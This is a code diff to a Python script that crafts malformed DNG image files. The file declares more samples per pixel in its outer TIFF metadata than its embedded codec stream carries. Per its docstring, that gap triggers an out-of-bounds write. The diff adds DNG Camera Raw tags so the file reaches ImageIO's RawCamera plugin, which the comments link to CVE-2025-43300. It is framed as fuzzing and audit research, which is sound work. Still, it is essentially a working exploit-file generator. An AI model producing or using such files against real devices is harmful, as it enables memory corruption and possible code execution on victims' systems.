@@ -31,6 +31,7 @@ import argparse
 
 TIFF_LE_MAGIC = b'II' + struct.pack('<H', 42)
 
+T_SUBFILE_TYPE       = 254
 T_IMAGE_WIDTH        = 256
 T_IMAGE_LENGTH       = 257
 T_BITS_PER_SAMPLE    = 258
@@ -44,22 +45,34 @@ T_X_RESOLUTION       = 282
 T_Y_RESOLUTION       = 283
 T_PLANAR_CONFIG      = 284
 T_RESOLUTION_UNIT    = 296
+T_CFA_REPEAT_DIM     = 33421
+T_CFA_PATTERN        = 33422
 T_DNG_VERSION        = 50706
 T_DNG_BACKWARD_VER   = 50707
 T_UNIQUE_CAM_MODEL   = 50708
+T_DEFAULT_SCALE      = 50718
+T_DEFAULT_CROP_ORIGIN = 50719
+T_DEFAULT_CROP_SIZE  = 50720
+T_COLOR_MATRIX1      = 50721
+T_AS_SHOT_NEUTRAL    = 50728
+T_BASELINE_EXPOSURE  = 50730
+T_CALIBRATION_ILLUM1 = 50778
+T_BLACK_LEVEL        = 50714
+T_WHITE_LEVEL        = 50717
 
 TY_BYTE     = 1
 TY_ASCII    = 2
 TY_SHORT    = 3
 TY_LONG     = 4
 TY_RATIONAL = 5
+TY_SRATIONAL = 10
 
 COMP_JPEG_LOSSLESS = 7
 COMP_JPEG2000      = 34712
 COMP_JPEG_LS       = 34892
 
-PHOTO_RGB        = 2
-PHOTO_LINEAR_RAW = 32803
+PHOTO_CFA        = 32803   # Camera Filter Array (Bayer raw)
+PHOTO_LINEAR_RAW = 34892   # Linear raw (demosaiced), required for multi-SPP DNG
 
 # ========================== Two-pass TIFF builder ==========================
 
@@ -115,6 +128,17 @@ class TiffBuilder:
 
     def add_rational(self, tag, num, den):
         self._add(tag, TY_RATIONAL, 1, struct.pack('<II', int(num), int(den)))
+
+    def add_srational(self, tag, num, den):
+        self._add(tag, TY_SRATIONAL, 1, struct.pack('<ii', int(num), int(den)))
+
+    def add_rational_array(self, tag, pairs):
+        data = b''.join(struct.pack('<II', int(n), int(d)) for n, d in pairs)
+        self._add(tag, TY_RATIONAL, len(pairs), data)
+
+    def add_srational_array(self, tag, pairs):
+        data = b''.join(struct.pack('<ii', int(n), int(d)) for n, d in pairs)
+        self._add(tag, TY_SRATIONAL, len(pairs), data)
 
     def add_strip(self, strip_tag_offset, strip_tag_count, data):
         """
@@ -352,23 +376,54 @@ def build_dng(width=64, height=64, spp=3, inner_comps=1,
       inner codec component count      -- inner metadata, controls loop iteration
 
     The gap between spp and inner_comps is what triggers the OOB write.
+
+    Uses PhotometricInterpretation=34892 (LinearRaw) + mandatory DNG Camera Raw
+    tags so ImageIO routes to the RawCamera plugin (same path as CVE-2025-43300).
     """
     b = TiffBuilder()
 
+    # --- Core TIFF tags ---
+    b.add_long(T_SUBFILE_TYPE, 0)           # 0 = full-resolution image (required by DNG)
     b.add_long(T_IMAGE_WIDTH,  width)
     b.add_long(T_IMAGE_LENGTH, height)
     b.add_short_array(T_BITS_PER_SAMPLE, [bits] * spp)
     b.add_short(T_COMPRESSION, codec)
-    b.add_short(T_PHOTOMETRIC, PHOTO_RGB)
-    b.add_short(T_SAMPLES_PER_PIXEL, spp)   # OUTER METADATA <--
+    # LinearRaw (34892) is the correct PhotometricInterpretation for processed DNG
+    # with multiple components — this routes to the Camera Raw plugin, same path
+    # as CVE-2025-43300.  RGB (2) routes to the generic TIFF plugin which lacks
+    # the DNG codec handlers.
+    b.add_short(T_PHOTOMETRIC, PHOTO_LINEAR_RAW)
+    b.add_short(T_SAMPLES_PER_PIXEL, spp)   # OUTER METADATA <-- controls alloc
     b.add_long(T_ROWS_PER_STRIP, height)
     b.add_short(T_PLANAR_CONFIG, 1)
     b.add_short(T_RESOLUTION_UNIT, 2)
     b.add_rational(T_X_RESOLUTION, 72, 1)
     b.add_rational(T_Y_RESOLUTION, 72, 1)
-    b.add_byte_array(T_DNG_VERSION,     bytes([1, 4, 0, 0]))
+
+    # --- DNG identification tags (mandatory for Camera Raw routing) ---
+    b.add_byte_array(T_DNG_VERSION,      bytes([1, 4, 0, 0]))
     b.add_byte_array(T_DNG_BACKWARD_VER, bytes([1, 1, 0, 0]))
-    b.add_ascii(T_UNIQUE_CAM_MODEL, 'Fuzz/Research')
+    b.add_ascii(T_UNIQUE_CAM_MODEL, 'FuzzResearch/ImageIOAudit')
+
+    # --- DNG Camera Raw mandatory tags ---
+    # DefaultScale: 1:1 pixel scale
+    b.add_rational_array(T_DEFAULT_SCALE, [(1, 1), (1, 1)])
+    # DefaultCropOrigin and DefaultCropSize
+    b.add_rational_array(T_DEFAULT_CROP_ORIGIN, [(0, 1), (0, 1)])
+    b.add_rational_array(T_DEFAULT_CROP_SIZE,   [(width, 1), (height, 1)])
+    # ColorMatrix1 (for D65 illuminant) - identity-ish 3x3 as 9 SRATIONALs
+    identity_cm = [(10000, 10000), (0, 1), (0, 1),
+                   (0, 1), (10000, 10000), (0, 1),
+                   (0, 1), (0, 1), (10000, 10000)]
+    b.add_srational_array(T_COLOR_MATRIX1, identity_cm)
+    b.add_short(T_CALIBRATION_ILLUM1, 21)   # D65
+    # AsShotNeutral: neutral color balance (all 1.0)
+    b.add_rational_array(T_AS_SHOT_NEUTRAL, [(1, 1)] * spp)
+    # BaselineExposure: 0 EV
+    b.add_srational(T_BASELINE_EXPOSURE, 0, 1)
+    # BlackLevel = 0, WhiteLevel = 2^bits - 1
+    b.add_short(T_BLACK_LEVEL, 0)
+    b.add_long(T_WHITE_LEVEL, (1 << bits) - 1)
 
     if codec == COMP_JPEG2000:
         payload = build_j2k(width, height, csiz=inner_comps, bits=bits)
